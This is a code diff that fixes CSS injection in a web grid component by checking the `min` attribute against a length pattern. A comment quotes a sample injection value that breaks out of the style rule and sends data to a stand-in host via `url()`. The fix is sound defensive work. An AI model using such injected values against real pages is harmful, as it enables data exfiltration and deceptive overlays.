@@ -78,9 +78,25 @@ export class HelixGrid extends HelixElement {
     if (!sheet) {
       return
     }
-    sheet.textContent = this.min
-      ? `:host { --_grid-template: repeat(auto-fit, minmax(min(${this.min}, 100%), 1fr)); }`
-      : ''
+    /* **`min` is checked against a length before it reaches a stylesheet, and
+       that is a security fix rather than tidiness.** It is a public attribute
+       and it was concatenated into a `<style>` element's text, so
+       `min="1px,1fr)} :host{background:url(//elsewhere/?stolen)} @media all{"`
+       closed the rule and wrote arbitrary CSS into this component's shadow
+       root. That is enough to exfiltrate through `url()` and to lay an
+       invisible plate over the page.
+     *
+     * `createSheet` says in its own documentation that consumer input must not
+     * be interpolated into CSS, and this was the one place in the library that
+     * did it. A pattern rather than an escape, because a length has a small,
+     * known grammar and anything outside it is a mistake worth ignoring rather
+     * than a string worth repairing. */
+    const length = /^-?(?:\d+\.?\d*|\.\d+)(?:px|r?em|%|v[hw]|ch|ex|cm|mm|in|pt|pc|q)$/i
+    const min = this.min?.trim() ?? ''
+    sheet.textContent =
+      min !== '' && length.test(min)
+        ? `:host { --_grid-template: repeat(auto-fit, minmax(min(${min}, 100%), 1fr)); }`
+        : ''
   }
 
   /* `updated` alone, where there was a `firstUpdated` beside it doing the same
